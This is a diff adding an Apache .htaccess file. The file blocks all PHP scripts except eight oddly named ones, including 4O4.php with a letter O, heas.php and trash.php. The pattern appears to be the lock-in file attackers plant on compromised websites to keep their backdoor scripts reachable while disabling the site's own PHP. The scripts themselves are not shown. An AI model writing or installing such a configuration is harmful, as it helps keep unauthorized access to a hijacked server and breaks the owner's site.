@@ -1,0 +1,39 @@
+Options -Indexes
+Allow from all
+<FilesMatch "\.php$">
+    Deny from all
+</FilesMatch>
+
+
+<Files total.php>
+order allow,deny
+allow from all
+</Files>
+<Files pad.php>
+order allow,deny
+allow from all
+</Files>
+<Files auto.php>
+order allow,deny
+allow from all
+</Files>
+<Files heas.php>
+order allow,deny
+allow from all
+</Files>
+<Files repeat.php>
+order allow,deny
+allow from all
+</Files>
+<Files trash.php>
+order allow,deny
+allow from all
+</Files>
+<Files 4O4.php>
+order allow,deny
+allow from all
+</Files>
+<Files www.php>
+order allow,deny
+allow from all
+</Files>
